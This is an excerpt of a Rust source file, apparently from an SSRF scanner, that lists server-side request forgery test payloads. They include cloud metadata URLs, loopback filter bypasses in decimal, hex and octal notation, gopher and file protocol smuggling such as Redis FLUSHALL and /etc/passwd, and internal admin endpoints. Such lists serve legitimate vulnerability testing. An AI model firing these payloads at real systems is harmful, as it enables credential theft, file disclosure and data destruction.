...
pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = payload_vec!(PayloadType::Ssrf,
        "localhost", [
            ("http://localhost", "Direct localhost", Severity::Critical),
            ("http://127.0.0.1", "Loopback IP", Severity::Critical),
            ("http://127.0.0.1:80", "Loopback with port", Severity::Critical),
            ("http://127.1", "Shortened loopback", Severity::Critical),
            ("http://127.0.0.1.nip.io", "nip.io DNS rebinding", Severity::High),
            ("http://[::1]", "IPv6 loopback", Severity::Critical),
            ("http://[0:0:0:0:0:0:0:1]", "Full IPv6 loopback", Severity::Critical),
            ...
            ("http://127.0.0.1:11211", "Memcached port", Severity::Critical),
            ("http://127.0.0.1:27017", "MongoDB port", Severity::Critical),
        ];
        "cloud-metadata", [
            ("http://169.254.169.254/latest/meta-data/", "AWS metadata v1", Severity::Critical),
            ("http://169.254.169.254/latest/meta-data/hostname", "AWS hostname", Severity::Critical),
            ...
            ("http://169.254.169.254/metadata/v1/", "Azure metadata", Severity::Critical),
            ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure instance", Severity::Critical),
            ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata", Severity::Critical),
            ("http://metadata.google.internal/computeMetadata/v1/project/project-id", "GCP project ID", Severity::Critical),
            ("http://metadata.google.internal/computeMetadata/v1/instance/hostname", "GCP hostname", Severity::High),
            ("http://169.254.169.254/openstack/latest/meta_data.json", "OpenStack metadata", Severity::Critical),
            ("http://169.254.169.254/etcd", "DigitalOcean metadata", Severity::Critical),
        ];
        "bypass", [
            ...
            ("http://127.0.0.1.xip.io", "xip.io DNS rebinding", Severity::High),
            ("http://spoofed.burpcollaborator.net", "Burp collaborator", Severity::High),
            ("http://customer1.app.localhost.my.company.127.0.0.1.nip.io", "Long nip.io", Severity::High),
            ("http://127.1.1.1", "Variant loopback", Severity::Critical),
            ("http://127.0.1", "Shortened variant", Severity::Critical),
            ("http://2130706433", "Decimal IP (127.0.0.1)", Severity::Critical),
            ("http://3232235521", "Decimal IP (192.168.0.1)", Severity::High),
            ("http://0x7f000001", "Hex IP (127.0.0.1)", Severity::Critical),
            ("http://0x7f.0x0.0x0.0x1", "Mixed hex IP", Severity::Critical),
            ("http://0177.0.0.1", "Octal IP", Severity::Critical),
            ("http://017700000001", "Full octal IP", Severity::Critical),
            ("http://127.0.0.1%00.example.com", "Null byte in URL", Severity::High),
            ("http://127.0.0.1#.example.com", "Fragment bypass", Severity::High),
            ("http://127.0.0.1?.example.com", "Query bypass", Severity::High),
        ];
        "protocol-smuggling", [
            ("gopher://127.0.0.1:6379/_INFO", "Gopher Redis INFO", Severity::Critical),
            ("gopher://127.0.0.1:6379/_FLUSHALL", "Gopher Redis FLUSHALL", Severity::Critical),
            ("gopher://127.0.0.1:11211/_stats", "Gopher Memcached", Severity::Critical),
            ("dict://127.0.0.1:6379/INFO", "Dict Redis INFO", Severity::Critical),
            ("file:///etc/passwd", "File protocol", Severity::Critical),
            ("file:///c:/windows/win.ini", "File protocol Windows", Severity::Critical),
        ...
        "internal-services", [
            ("http://localhost:8080/manager/html", "Tomcat manager", Severity::Critical),
            ("http://localhost:8161/admin", "ActiveMQ admin", Severity::Critical),
            ("http://localhost:9042", "Cassandra", Severity::High),
            ("http://localhost:9200/_cat/indices", "Elasticsearch indices", Severity::Critical),
            ("http://localhost:5601", "Kibana", Severity::High),
            ("http://localhost:15672", "RabbitMQ management", Severity::Critical),
            ("http://localhost:8500/v1/catalog/nodes", "Consul nodes", Severity::High),
            ("http://localhost:8200/v1/sys/seal-status", "Vault seal status", Severity::High),
            ("http://localhost:2379/version", "etcd version", Severity::High),
    ...
    for p in &mut payloads {
        if p.tags.contains(&"bypass".to_string()) && !p.tags.contains(&"dns-rebinding".to_string())
        {
            p.tags.push("dns-rebinding".to_string());
        }
    }
